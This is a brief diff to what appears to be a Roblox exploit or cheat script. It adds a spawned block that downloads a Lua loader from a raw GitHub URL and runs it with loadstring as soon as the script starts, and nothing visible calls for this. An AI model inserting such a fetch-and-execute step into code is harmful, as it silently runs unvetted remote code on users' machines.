@@ -53,6 +53,10 @@ if game.CoreGui:FindFirstChild("AF") then
     return
 end
 
+spawn(function()
+    (loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX-New/TwoDev/main/Loader.lua"))())("info")
+end)
+
 local ps = game:GetService("Players")
 local rs = game:GetService("ReplicatedStorage")
 local ts = game:GetService("TweenService")
